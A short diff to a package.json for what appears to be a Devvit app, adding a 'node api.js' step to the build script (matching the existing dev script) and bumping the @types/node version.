@@ -5,7 +5,7 @@
   "license": "BSD-3-Clause",
   "type": "module",
   "scripts": {
-    "build": "vite build",
+    "build": "node api.js && vite build",
     "deploy": "npm run type-check && npm run lint && devvit upload",
     "dev": "node api.js && devvit playtest",
     "launch": "npm run deploy && devvit publish",
@@ -27,7 +27,7 @@
   },
   "devDependencies": {
     "@eslint/js": "10.0.1",
-    "@types/node": "^22.19.19",
+    "@types/node": "^22.20.5",
     "eslint": "10.6.0",
     "globals": "17.7.0",
     "prettier": "3.9.4",
